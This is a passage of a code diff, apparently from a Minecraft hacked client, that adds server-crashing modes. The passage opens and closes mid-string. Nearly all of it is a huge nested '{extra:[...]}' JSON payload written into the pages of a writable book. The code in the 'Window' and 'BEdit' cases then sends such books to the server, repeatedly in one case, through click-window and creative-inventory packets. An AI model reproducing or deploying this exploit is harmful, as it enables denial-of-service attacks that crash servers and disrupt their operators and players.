extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
+                    }
+
+                    comp.setString("author", RandomStringUtils.random(16, "0123456789"));
+                    comp.setString("title", RandomStringUtils.random(16, "0123456789"));
+                    comp.setByte("resolved", (byte) 1);
+                    comp.setTag("pages", list);
+                    final ItemStack stack = new ItemStack(Items.writable_book);
+                    stack.setTagCompound(comp);
+                    final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+                    buffer.writeItemStackToBuffer(stack);
+                    PacketUtil.sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
+                }
+                break;
+            }
+
+            case "Window": {
+                final NBTTagCompound tag = new NBTTagCompound();
+                final NBTTagList list = new NBTTagList();
+
+                for (int i = 0; i &lt; 2; i++) {
+                    list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
+                }
+
+                tag.setString("author", RandomStringUtils.random(16, "0123456789"));
+                tag.setString("title", RandomStringUtils.random(16, "0123456789"));
+                tag.setByte("resolved", (byte) 1);
+                tag.setTag("pages", list);
+                final ItemStack book = new ItemStack(Items.writable_book);
+                book.setTagCompound(tag);
+                PacketUtil.sendPacket(new C10PacketCreativeInventoryAction(0, book));
+                break;
+            }
+
+            case "BEdit": {
+                for (int c = 0; c &lt; 30; c++) {
+                    final NBTTagCompound comp = new NBTTagCompound();
+                    final NBTTagList list = new NBTTagList();
+
+                    for (int i = 0; i &lt; 2; i++) {
+                        list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extr